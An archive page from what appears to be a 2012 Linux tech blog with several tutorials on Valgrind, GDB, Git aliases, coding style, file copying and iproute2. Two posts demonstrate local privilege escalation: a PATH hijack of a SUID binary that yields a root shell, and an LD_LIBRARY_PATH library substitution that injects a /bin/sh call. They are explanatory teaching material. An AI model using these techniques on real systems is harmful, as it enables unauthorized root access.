<p>Indeed, we missed space for the <code>\0</code> terminating character. Suppose we do this fix: we change <code>strcpy(q, s)</code> with <code>strcpy(q, s + 1)</code>. This works.</p>
<p>Now, let us assume that – by mistake – we also change <code>q</code>:</p>
<p>{% highlight cpp %} int main() { char *s = strdup(“Valgrind rocks”); strcpy(s, s + 1); return 0; } {% endhighlight %}</p>
<p><a href="http://valgrind.org/">Valgrind</a> is prompt to show us that we use <code>strcpy</code> in a wrong way, possibly destroying content:</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind -q ./a.out
==12058== Source and destination overlap in strcpy(0x51d2040, 0x51d2041)
==12058==    at 0x4C2B2F5: strcpy (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==12058==    by 0x400600: main (1.c:9)</code></pre>
<p>But what if that was the indented behaviour? What if we really needed to remove the first letter of <code>s</code>?</p>
<p>We can generate a suppression and use it in other calls of <a href="http://valgrind.org/">Valgrind</a> to ignore this error. To generate it, we use another flag:</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind --gen-suppressions=yes -q ./a.out
==12079== Source and destination overlap in strcpy(0x51d2040, 0x51d2041)
==12079==    at 0x4C2B2F5: strcpy (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==12079==    by 0x400600: main (1.c:9)
==12079==
==12079==
==12079== ---- Print suppression ? --- [Return/N/n/Y/y/C/c] ---- y
{
   &lt;insert_a_suppression_name_here&gt;
   Memcheck:Overlap
   fun:strcpy
   fun:main
}</code></pre>
<p>We copy the printed lines into a file, <code>strcpy_main.supp</code>:</p>
<pre><code>{
   strcpy_main
   Memcheck:Overlap
   fun:strcpy
   fun:main
}</code></pre>
<p>When we run <a href="http://valgrind.org/">Valgrind</a> again, we will use this file to ignore that error.</p>
<pre><code>mihai@keldon:/tmp/mm/valgrind$ valgrind --suppressions=strcpy_main.supp -q ./a.out
mihai@keldon:/tmp/mm/valgrind$</code></pre>
<p>Even though this works, we should not use <code>strcpy</code> with overlapping arguments. The manual page for <code>strcpy</code> tells:</p>
<pre><code>The  strcpy()  function  copies  the  string pointed to by src, including
the terminating null byte ('\0'), to the buffer pointed to by dest. The
strings may not overlap, and the destination string dest must be large
enough to receive the copy.</code></pre>
<p>One last word before finishing this article. If your program has too many errors, <a href="http://valgrind.org/">Valgrind</a> tries to be funny and gives the following message:</p>
<pre><code>==21573== More than 10000000 total errors detected.  I'm not reporting any more.
==21573== Final error counts will be inaccurate.  Go fix your program!</code></pre>
<p>You should do this, of course.</p>
<p>In a later article we will show how can you combine <a href="http://valgrind.org/">Valgrind</a> and <a href="http://sources.redhat.com/gdb/">GDB</a> to fix some nasty bugs. But until then, remember how to use <a href="http://valgrind.org/docs/manual/mc-manual.html">Memcheck</a> and keep in mind that <a href="http://valgrind.org/">Valgrind</a> has many useful tools and a programmer can create others if he needs them.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./exploiting-environment-variables-part-2.html" title="Exploiting environment variables Part 2">Exploiting environment variables Part 2</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on April 23, 2012</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>Based on the <a href="http://techblog.rosedu.org/exploiting-environment-variables.html">previous article</a>, let’s go one step further and study a similar exploit. This time we’ll be dealing with executables and <a href="http://techblog.rosedu.org/library-management.html">dynamic libraries</a>.</p>
<p>Let’s consider a simple custom library function:</p>
<pre><code>/* random.h */
int xkcd_random(void);

/* random.c */
int xkcd_random()
{
	return 4;
}</code></pre>
<p>We can build it into a shared library:</p>
<pre><code>$ gcc --share -fPIC -o librandom.so random.c</code></pre>
<p>Let’s take a simple program that uses our function:</p>
<pre><code>/* main.c */
#include &lt;stdio.h&gt;
#include &quot;random.h&quot;

int main(void)
{
	printf(&quot;8ball says:%d\n&quot;, xkcd_random());
	return 0;
}</code></pre>
<p>If we want to use out shared object file in the current directory, we have to do two things. First, compile the program and link the shared library (with the <code>-l</code> flag) using libraries in the current directory (we do that using the <code>-L.</code> flag).</p>
<pre><code>$ gcc -o main -L.  main.c -lrandom</code></pre>
<p>Second, the library will be linked at compile time, but it won’t be loaded at runtime unless the loaded knows where the library is, with the help of the <code>LD_LIBRARY_PATH</code> variable.</p>
<pre><code>$ ./main ./main: error while loading shared libraries:
librandom.so: cannot open shared object file: No such file
or directory
$ export LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH
$ ./main
8ball says:4</code></pre>
<p>To ensure that we can always use the library, we can place it in the system’s library directory. Note that this means that we trust the code of that library and only the administrator can do this</p>
<pre><code># mv librandom.so /usr/lib</code></pre>
<p>So now, each time the main program runs, the loader will dynamically load the random function from the system. But what if we have another function, from another library that has the same name, but does something else:</p>
<pre><code>/* evil.c */
#include &lt;unistd.h&gt;
int xkcd_random()
{
	return 666;
}

$ gcc --share -fPIC -o librandom.so evil.c</code></pre>
<p>If we overwrite the <code>LD_LIBRARY_PATH</code> variable with the <code>.</code> directory, the loader will use the <code>./librandom.so</code> instead of <code>/usr/lib/librandom.so</code> and it doesn’t require any modification of the main program (no recompile needed).</p>
<pre><code>$ ./main
8ball says:4
$ export LD_LIBRARY_PATH=.:LD_LIBRARY_PATH
$ ./main
8ball says:666</code></pre>
<p>This is a similar to the <code>PATH</code> variable hack discussed in the <a href="http://techblog.rosedu.org/exploiting-environment-variables.html">previous article</a>, but at a much more lower level. We can add a possible exploit here, like a shell execution:</p>
<pre><code>#include &lt;unistd.h&gt;
int xkcd_random()
{
	execlp(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, NULL);
	return 666;
}</code></pre>
<p>Like we did before, we used a root-owned executable that had the <code>SETUID</code> bit set, in order to run things as root.</p>
<pre><code>$ ls -la main
-rwsrwsr-x 1 root root 7192 2012-04-18 15:13 main
$ export LD_LIBRARY_PATH=.:LD_LIBRARY_PATH
$ ./main
8ball says:4</code></pre>
<p>The program executed safely.</p>
<p>The Library Loader is smart enough to ignore the <code>LD_LIBRARY_PATH</code> when the executable is setuid-ed, because of exact such attacks. So even though you can exploit programs as a normal user, you can’t affect system. So low level is a little more secure than scripting level.</p>
<p>Here is a related <a href="http://xahlee.org/UnixResource_dir/_/ldpath.html">article</a> that explains why <code>LD_LIBRARY_PATH</code> exists but also why it’s evil.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./git-speeding-workflow.html" title="Git: speeding workflow">Git: speeding workflow</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on April 21, 2012</span>
            by
            <span class="author">Andrei</span>
            </span>

            <p>If you didn’t read the <a href="http://techblog.rosedu.org/git-good-practices.html">techblog Git Tips and Good Practices</a> article yet, you should, as it offers tips every git user should know, together with some very useful references.</p>
<p>When using <code>git</code> for the first time, one has to specify his <em>name</em> and <em>email</em>, so <code>git</code> can associate the commit with who committed it:</p>
<pre><code>$ git config --global user.name &quot;Firstname Lastname&quot;
$ git config --global user.email &quot;your_email@youremail.com&quot;</code></pre>
<p>This adds info to <code>~/.gitconfig</code>, a global configuration file <code>git</code> uses. Also, every git project has its own <code>.git/config</code> file (similar to the global one), and any options from this file overwrites the options from the global file.</p>
<pre><code>andrei@sherlock:~$ cat ~/.gitconfig
[user]
    name = Andrei Petre			# filled by the
    email = p31andrei@gmail.com		# above commands
[color]
    ui = auto
    pager = true
[core]
    editor = vim
[github]
    user = andreip
    token = ...
[alias]
    co = checkout
    ci = commit
    st = status
    br = branch
    df = diff
    pa = add --patch
    rlog = reflog			# useful for lost SHA's
    type = cat-file -t
    dump = cat-file -p
    hist = log --pretty=format:\&quot;%h %ad | %s%d [%an]\&quot; --graph --date=short
    lg = log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset 
         %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --date=relative</code></pre>
<p>Most of these configurations are self explanatory. The part that I find it most useful and what this article was all about (but needed an intro) are the last two aliases.</p>
<ul>
<li><code>git hist</code> (from <a href="http://gitimmersion.com/">gitimmersion</a>) is a short version of <code>git log</code></li>
</ul>
<p><img style="float:center" src="./images/git-alias-hist.png" alt="git lg" width="620" height="215" /></p>
<ul>
<li><code>git lg</code> (from <a href="https://github.com/xhr">Andrei Maxim</a>) is also a short and pretty formatting version of <code>git log</code></li>
</ul>
<p><img style="float:center" src="./images/git-alias-lg.png" alt="git lg" width="620" height="215" /></p>
<p>Use the one you like best, and add speed to your workflow.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./gdb-a-basic-workflow.html" title="GDB: A basic workflow">GDB: A basic workflow</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on April  3, 2012</span>
            by
            <span class="author">Andrei</span>
            </span>

            <p>The GNU Debugger Command (GDB) is a very useful debugging tool, widely used in the C environment.</p>
<p><strong>Workflow</strong></p>
<p>GDB can be run in two distinct ways:</p>
<ul>
<li>using the <strong>gdb</strong> command</li>
<li>using a <strong>core</strong> generated file, usually from a serious error</li>
</ul>
<p>Let’s have a look at the former one on a simple program:</p>
<p>{% highlight cpp %} int random() { int r = 4; return r; }</p>
<p>int main() { char <em>no_addr = 0; </em>no_addr = random(); return 0; } {% endhighlight %}</p>
<p>The -g compiler option is used to add debugging information to the executable (here a.out) for use by GDB. We’ll run it again using gdb, because the above code gives us a segfault error:</p>
<pre><code>$ gcc -Wall -g random.c
$ gdb a.out
[...]
(gdb) run
Program received signal SIGSEGV, Segmentation fault.
0x080483c5 in main () at random.c:7
7		*no_addr = random();</code></pre>
<p>So this helps us a lot, it even shows us the line causing the problem. Now we’ll create a core file to show how the latter one works, too. Note that # at the beginning of the line specifies that commands are run as root:</p>
<pre><code># ulimit -c 4      			# set core file size to 4 blocks
# ./a.out
Segmentation fault (core dumped)
# gdb ./a.out core
Core was generated by `./a.out'.
Program terminated with signal 11, Segmentation fault.
#0  0x080483cd in main () at random.c:7
7		*no_addr = random();</code></pre>
<p><strong>Useful commands</strong></p>
<p>Let’s see a common workflow, while using GDB:</p>
<pre><code>$ gdb a.out				# run with gdb debugger
(gdb) break main			# set up breakpoint at main() function
Breakpoint 1 at 0x80483bc: file random.c, line 6.
					# this suspends the program
					# can also receive file name (break random.c:3)
					# or address (break *0x080483c5)
(gdb) run				# .. just run the thing
Starting program: /home/andrei/a.out 

Breakpoint 1, main () at random.c:6	# it stops at first breakpoint
6		char *no_addr = 0;
(gdb) next				# execute next line, doesn't enter functions
7		*no_addr = random();
(gdb) step				# like next, but enters functions
random () at random.c:2
2		int r = 4;

(gdb) next
3	return r;
(gdb) print r				# print values in decimal
$1 = 4
(gdb) print /x				# hexa
$2 = 0x4
(gdb) print /o				# octal
$3 = 04
(gdb) print &amp;r
$4 = (int *) 0xbfffef5c
(gdb) list				# list source code
1    int random() {
2        int r = 4;
3        return r;
4    }
5    int main() {
6        char *no_addr = 0;
7        int r = random();
8        *no_addr = r;
9        return 0;
10    }

(gdb) break 8 				# add breakpoint at line 8
Breakpoint 2 at 0x80483cb: file random.c, line 8.
(gdb) continue 				# continue to next breakpoint
Continuing.

Breakpoint 2, main () at random.c:8
8		*no_addr = r;
(gdb) next

Program received signal SIGSEGV, Segmentation fault.
0x080483d3 in main () at random.c:8
8		*no_addr = r;
(gdb) backtrace 			# print stack backtrace; show trace of where you are
					# which functions you're in
#0  0x080483d3 in main () at random.c:8
(gdb) quit</code></pre>
<p>Now, some other thing you may find useful is to have the value of an expression get printed frequently (automatically, of course). You can do that with <code>display expression</code>. Take this sample code:</p>
<p>{% highlight cpp %} int main() { int i, j = 0; for (i = 0; i &lt; 10; i++) j += i * 10; return 0; } {% endhighlight %}</p>
<p>And run it in <code>gdb</code>:</p>
<pre><code>(gdb) break main
Breakpoint 1 at 0x804839a: file random2.c, line 2.
(gdb) run
Starting program: /home/andrei/a.out 

Breakpoint 1, main () at random2.c:2
2		int i, j = 0;
(gdb) next
3		for (i = 0; i &lt; 10; i++)
(gdb) next
4			j += i * 10;
(gdb) display i
1: i = 0
(gdb) display j
2: j = 0
(gdb) break 4 if i == 8
Breakpoint 2 at 0x80483aa: file random2.c, line 4.
(gdb) continue
Continuing.

Breakpoint 2, main () at random2.c:4
4			j += i * 10;
2: j = 280
1: i = 8</code></pre>
<p>This way you can see how your variables’ value change. To delete a display, use the number associated with it:</p>
<pre><code>(gdb) delete display 2
(gdb) next
4			j += i * 10;
1: i = 3</code></pre>
<p>One last trick worth mentioning in this initial GDB tutorial is setting up your <code>~/.gdbinit</code> file. When GDB starts up, it looks for a file in the current user’s home directory called <code>.gdbinit</code>; this file is used for simple configuration commands. The format is the following:</p>
<pre><code>define &lt;command&gt;
&lt;code&gt;
end
document &lt;command&gt;
&lt;help text&gt;
end</code></pre>
<p>A simple example of <code>.gdbinit</code>:</p>
<pre><code>andrei@sherlock:~$ cat .gdbinit
define cls
shell clear
end
document cls
Clears the screen with a simple command.
end

define bpl
info breakpoints
end
document bpl
List breakpoints
end</code></pre>
<p>Now you can use <code>cls</code> to clear the screen in gdb, or you can find what breakpoints you’ve set:</p>
<pre><code>(gdb) bpl
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x0804839a in main at random2.c:2
2       breakpoint     keep y   0x080483aa in main at random2.c:4</code></pre>
<p>You can also use <code>.gdbinit</code> inside your project’s directory to include commands used only for this project. It will be read when starting <code>gdb</code> in that directory and it overwrites the settings in <code>~/.gdbinit</code>. You can add into it a few commands to be run when the <code>gdb</code> starts: commands like setting up the breakpoints and the values used with <code>display</code> commands.</p>
<p>Using the previous source code, we add the following <code>.gdbinit</code> file in the same directory:</p>
<pre><code>b main
r
disp i
disp j
disp /x i
disp</code></pre>
<p>Now, we can run <code>gdb</code>:</p>
<pre><code>$ gdb -q ./a.out
Reading symbols from /tmp/a.out...done.
Breakpoint 1 at 0x804839a: file 1.c, line 5.

Breakpoint 1, main () at 1.c:5
5		int i, j = 0;
3: /x i = 0x0 2: j = 134513616
1: i = 0
(gdb) n
6		for (i = 0; i &lt; 10; i++)
3: /x i = 0x0
2: j = 0
1: i = 0
(gdb) q</code></pre>
<p>Observe the last <code>disp</code> in the <code>.gdbinit</code> file, used to display all expressions defined up to that point.</p>
<p>If you want to disable reading the <code>.gdbinit</code> files, pass a <code>-n</code> flag to <code>gdb</code> just like we passed <code>-q</code> above to strip the header with version info.</p>
<p>Final notes. <strong>CGDB</strong> is a curses front-end to GDB and is more friendly and coloured than GDB. Also, try this in GDB (I know this from Andrada):</p>
<pre><code>(gdb) b main
Breakpoint 1 at 0x804839a: file random2.c, line 2.
(gdb) r
Starting program: /home/andrei/a.out 
Breakpoint 1, main () at random2.c:2
2		int i, j = 0;
(gdb) -					# add dash and enter</code></pre>
<p>For more on GDB, check out this tutorial, <a href="https://blogs.oracle.com/ksplice/entry/8_gdb_tricks_you_should">8 gdb tricks you should know</a>.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./exploiting-environment-variables.html" title="Exploiting environment variables">Exploiting environment variables</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on March 27, 2012</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>Environment variables are sometimes very important when creating new processes. For example, the <code>PATH</code> variable, that decides what executable to run.</p>
<p>The easiest example to exploit <code>PATH</code> is to add the current directory <code>.</code> to the list and overwrite common shell commands with something else.</p>
<pre><code>$ cat ./ls
echo P0wn3d
$ ls
file1 file2
$ ./ls
P0wn3d
$ export PATH=.:$PATH
$ ls
P0wn3d</code></pre>
<p>But that can only affect the user’s shell and can’t do harm to the system. What if some other conditions exist in the system, like the use of the SUID bit. Normal processes are run as the user who executes them, regardless of who owns the executable file (as long as the user who runs the file can read the file). If the SUID is set on an executable file, any process started from that executable will run as the owner of the file, not shell owner. Here is an example of a very insecure source that <strong>shouldn’t</strong> be SUID-ed.</p>
<p>{% highlight cpp %} #include<stdlib.h></p>
<p>int main(void) { system(“ls”); return 0; } {% endhighlight %}</p>
<p>Let’s assume that the compiled executable from this code is owned by root, SUID-ed and put into /bin with the name <code>ls_root</code>.</p>
<pre><code>$ ls -la /bin/ls_root
-rwsrwsr-x 1 root root 7163 2012-03-21 12:28 /bin/ls_root</code></pre>
<p>What this will enable, for example, is the listing of the <code>/root</code> directory by any user.</p>
<pre><code>$ cd /root
$ ls
ls: cannot open directory .: Permission denied
$ sudo ls
test
$ ls_root
test</code></pre>
<p>The code simply executes the <code>ls</code> command. But what if the <code>ls</code> command isn’t doing what it is supposed to do? Given this setup, as a normal user, we can do the following:</p>
<pre><code>$ ln -s /bin/sh ls
$ echo $$
32655
$ ls
ls  ls_root.c
$ ./ls
$ echo $$
32730
$ whoami
alexj
$ exit
$ export PATH=.:$PATH
$ ls_root
# whoami
root
#</code></pre>
<p>The <code>ls_root</code> process will run the <code>ls</code> command. The <code>ls</code> command will run an executable specified by the <code>PATH</code> variable (the executable is <code>/bin/ls</code>). But if the <code>PATH</code> variable is changed in the current bash process, the executable ran by the <code>ls</code> command will now become something else. If the <code>ls_root</code> command is ran by root (with the help of the SUID bit), any of its children will also be processes of root. So, if the <code>ls</code> command will now run a bash executable, it will run a root owned executable that leads to root access.</p>
<p>The SUID is something that is used in Linux systems (sudo and even ping use it), but these executables are very carefully implemented so that normal users can’t exploit them.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./tips-on-coding-style.html" title="Tips on coding style">Tips on coding style</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on February 28, 2012</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>Good programmers know that writing code is more than just… writing code. It’s more than writing efficient code… It’s also about writing good code with respect to the ones that are going to read and/or use that code. This is specially true in open source communities where potentially hundreds of people could be looking at your code. You have to write code that can be easily read and used by others. And to do that, you need some some sort of standards of code writing. This is where the idea of <strong>coding styles</strong> comes in.</p>
<p>Every software project has its (hopefully properly defined) coding style. It can depend a lot on the programming language that the project uses. The style can specify the indentation, the variable naming, the use of spaces or the use of curly braces.</p>
<p>For example, the Linux Kernel has its coding style well defined in the <a href="http://www.kernel.org/doc/Documentation/CodingStyle">Documentation pages</a>. It is based on the Kernighan &amp; Ritchie (K&amp;R) style, the Linux Kernel being written in C. This is a very popular coding style with several projects using it, sometimes considered the de facto coding style for C.</p>
<p>If you want to check if your code follows the coding style of Linux, you can use <strong>checkpatch.pl</strong>. This script can be found in the source code of the Linux Kernel in the scripts directory. It is mainly used for checking patches submitted for Linux, but it can be used on normal C source fies using the <strong>-f</strong> parameter. You need to clone the Linux tree to get the script, and you need to run it from the root of the tree.</p>
<p>Here is an example of badly written code:</p>
<pre><code>  1 
  2 int main(void)···
  3 {
  4    int i,a;···
  5 »       »       
  6    for(i=0;i&lt;10;i++)
  7       a=i;
  8    //this code is useless
  9    if(a==i){
 10    return 0;
 11    }
 12 
 13    return 0;
 14 }·····</code></pre>
<p>Note that the · character would represent a space and » would represent a tab. Spaces would represent… spaces.</p>
<p>And this is what checkpatch would report:</p>
<pre><code>alexj@ixmint ~/linux $ scripts/checkpatch.pl -f bad.c
ERROR: trailing whitespace
#2: FILE: bad.c:2:
+int main(void)   $

ERROR: trailing whitespace
#4: FILE: bad.c:4:
+   int i,a;   $

WARNING: please, no spaces at the start of a line
#4: FILE: bad.c:4:
+   int i,a;   $

ERROR: space required after that ',' (ctx:VxV)
#4: FILE: bad.c:4:
+   int i,a;   
	 ^

ERROR: trailing whitespace
#5: FILE: bad.c:5:
+^I^I$

WARNING: please, no spaces at the start of a line
#6: FILE: bad.c:6:
+   for(i=0;i&lt;10;i++)$

WARNING: suspect code indent for conditional statements (3, 6)
#6: FILE: bad.c:6:
+   for(i=0;i&lt;10;i++)
+      a=i;

ERROR: spaces required around that '=' (ctx:VxV)
#6: FILE: bad.c:6:
+   for(i=0;i&lt;10;i++)
	 ^

ERROR: space required after that ';' (ctx:VxV)
#6: FILE: bad.c:6:
+   for(i=0;i&lt;10;i++)
	   ^

ERROR: spaces required around that '&lt;' (ctx:VxV)
#6: FILE: bad.c:6:
+   for(i=0;i&lt;10;i++)
	     ^

ERROR: space required after that ';' (ctx:VxV)
#6: FILE: bad.c:6:
+   for(i=0;i&lt;10;i++)
		^

ERROR: space required before the open parenthesis '('
#6: FILE: bad.c:6:
+   for(i=0;i&lt;10;i++)

WARNING: please, no spaces at the start of a line
#7: FILE: bad.c:7:
+      a=i;$

ERROR: spaces required around that '=' (ctx:VxV)
#7: FILE: bad.c:7:
+      a=i;
	^

WARNING: please, no spaces at the start of a line
#8: FILE: bad.c:8:
+   //this code is useless$

ERROR: do not use C99 // comments
#8: FILE: bad.c:8:
+   //this code is useless

WARNING: please, no spaces at the start of a line
#9: FILE: bad.c:9:
+   if(a=i){$

WARNING: suspect code indent for conditional statements (3, 3)
#9: FILE: bad.c:9:
+   if(a=i){
+   return 1;

ERROR: spaces required around that '=' (ctx:VxV)
#9: FILE: bad.c:9:
+   if(a=i){
	^

ERROR: space required before the open brace '{'
#9: FILE: bad.c:9:
+   if(a=i){

ERROR: space required before the open parenthesis '('
#9: FILE: bad.c:9:
+   if(a=i){

ERROR: do not use assignment in if condition
#9: FILE: bad.c:9:
+   if(a=i){

WARNING: braces {} are not necessary for single statement blocks
#9: FILE: bad.c:9:
+   if(a=i){
+   return 1;
+   }

WARNING: please, no spaces at the start of a line
#10: FILE: bad.c:10:
+   return 1;$

WARNING: please, no spaces at the start of a line
#11: FILE: bad.c:11:
+   }$

WARNING: please, no spaces at the start of a line
#13: FILE: bad.c:13:
+   return 0$

ERROR: trailing whitespace
#14: FILE: bad.c:14:
+}     $

total: 16 errors, 11 warnings, 14 lines checked

NOTE: whitespace errors detected, you may wish to use scripts/cleanpatch or
      scripts/cleanfile

bad.c has style problems, please review.</code></pre>
<p>Most of the errors are regarding whitespaces, space or tab characters that shouldn’t be there. It’s hard to spot spaces or tabs because they are invisible. But a good tip is to make them visible in your editor. Visually replacing characters will not modify the source (spaces will still be spaces) but they will pop up in your editor so you know to delete them. For example, in vi you can use this (credits to ddvlad for it):</p>
<pre><code>set list listchars=tab:»\ ,trail:·,extends:»,precedes:«</code></pre>
<p>Other warnings come from the fact that indentation was made with 3 spaces and not 8. Tabs and spaces should be used consistently. For example, you can set in vi the ‘width’ of a tab with:</p>
<pre><code>:set tabstop=8</code></pre>
<p>There are places where you don’t want spaces, but there are situations where you do want them. You should leave a space after keywords like <strong>if</strong> or <strong>for</strong> and around operators like <strong>=</strong>. Doing this makes the code a lot more readable.</p>
<p>Curly braces should be used, but only when needed. If an <strong>if</strong> has only one instruction to be executed on the branch, it is pointless to have braces enclosing it. Indentation is enough to mark the instruction.</p>
<p>Comment types are a delicate subject. The classic C specification only allows /* */ block comments. C99 allows // as one line comments. Some coding styles (like the Linux coding style) don’t allow C99 comments.</p>
<p>This is the way the code <strong>should</strong> look like with proper coding style:</p>
<pre><code>  1 int main(void)
  2 {
  3 »       int i, a;
  4 
  5 »       for (i = 0; i &lt; 10; i++)
  6 »       »       a = i;
  7 »       /* This code is useless */
  8 »       if (a == i)
  9 »       »       return 1;
 10 
 11 »       return 0;
 12 }</code></pre>
<p>Other programing languages can have similar coding guidelines. For Python, there is <a href="http://www.python.org/dev/peps/pep-0008/">PEP</a>, as dictated by the creator of Python himself.</p>
<p>But we should always keep in mind that there is no One True Coding Style. Like all great debates, everybody could argue that one is better than another. What is important and everybody (mostly) agrees is to have consistency within a project in regards to the code the community writes.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./copying-files.html" title="Copying files">Copying files</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on February 26, 2012</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>You are on a (Linux) box and you want to transfer some files on another system. What are some ways to do that?</p>
<p>The first and most obvious way is to copy them over <strong>ssh</strong> using the <strong>scp</strong> tool. You can copy to and from the server and you can use the recursive copy to transfer entire directories.</p>
<p>But what if you don’t have proper account access (you can’t reach accounts because of lack of passwords or keys, for example)? Here is a rather hackish solution: nc.</p>
<p>The <strong>netcat</strong> tool (the <strong>nc</strong> command) is found on most Linux systems. You can create TCP or UDP servers and clients with just one command. You can use the shell redirection operators to put files into a TCP stream and take the data out of the stream. Here is an example of a copy from a server to a client:</p>
<pre><code>Server:
alexj@ixmint ~ $ md5sum lin.zip
3008726d03363b89bcf743c0fde4d5f8  lin.zip
alexj@ixmint ~ $ cat lin.zip|nc -l 12345

Client:
alexj@hathor /tmp $ nc ixmint.local 12345 &gt;lin.zip
alexj@hathor /tmp $ md5sum lin.zip
3008726d03363b89bcf743c0fde4d5f8  lin.zip</code></pre>
<p>You could transfer an entire directory (or several files) by first compressing the content.</p>
<pre><code>Server:
alexj@ixmint ~ $ tar -czvf - some_folder | nc -l 12345

Client:
alexj@hathor /tmp $ nc ixmint.local 12345 | tar xzvf -</code></pre>
<p>What other more userfriendly ways are threre? HTTP would be good at this, but configuring Apache with vhosts and aliases is kind of an overhead. What you can do, is start a HTTP server using <strong>Python</strong> in just one line (of course, you need python installed):</p>
<pre><code>alexj@ixmint ~ $ python -m SimpleHTTPServer 1234
Serving HTTP on 0.0.0.0 port 1234 ...</code></pre>
<p>The current working directory where you ran the command will be the www root and any files in that directory will be published (as long as the process will have correct permissions to those files). You can then use a web browser (it can be Firefox or other GUI clients or a simple <strong>wget</strong>) to access the URL.</p>
<p>Credits to Alex Morega for <code>tar|nc</code> idea and Vlad Dogaru for <code>python SimpleHTTPServer</code> idea.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./ifconfig-vs-iproute.html" title="ifconfig vs iproute2">ifconfig vs iproute2</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on January 17, 2012</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>On modern Linux distributions, the users have two main possibilities of configuring the network: ifconfig and ip.</p>
<p>The ifconfig tool is part of the <strong>net-tools</strong> package along side other tools like route, arp and netstat. These are the traditional userspace tools for network configuration, made for older Linux kernels.</p>
<p>The <strong>iproute2</strong> is the new package that comes with the ip tool as replacement for the ifconfig, route and arp commands, ss as the new netstat and tc as a new command.</p>
<p>There are pros and cons for each of them and there are users (and fans) of each. Let’s see the differences…</p>
<p>First of all, why was the iproute introduced? There had to have been a need for it… The reason was the introduction of the <strong><a href="http://www.faqs.org/rfcs/rfc3549.html" title="Netlink">Netlink</a></strong> API, which is a socket like interface for accessing kernel information about interfaces, address assignments and routes. The tools like ifconfig used the /proc file hierarchy (procfs) for collecting information. The output was reformatted data from different network related files in /proc.</p>
<pre><code>alexj@hathor ~/techblog $ strace -e open ifconfig eth0 2&gt;&amp;1|grep /proc
open(&quot;/proc/net/dev&quot;, O_RDONLY)         = 6
open(&quot;/proc/net/if_inet6&quot;, O_RDONLY)    = 6</code></pre>
<p>The costs for the operations like open and read from these files were rather big compared for the netlink interface. For comparison, let’s assume that we have a large number of interfaces (128) with IPv4 and IPv6 addresses and their associated connected routes.</p>
<pre><code>alexj@hathor ~/if $ time ifconfig -a &gt;/dev/null 

real	0m1.528s
user	0m0.080s
sys	0m1.420s

alexj@hathor ~/if $ time ip addr show &gt;/dev/null

real	0m0.016s
user	0m0.000s
sys	0m0.012s</code></pre>
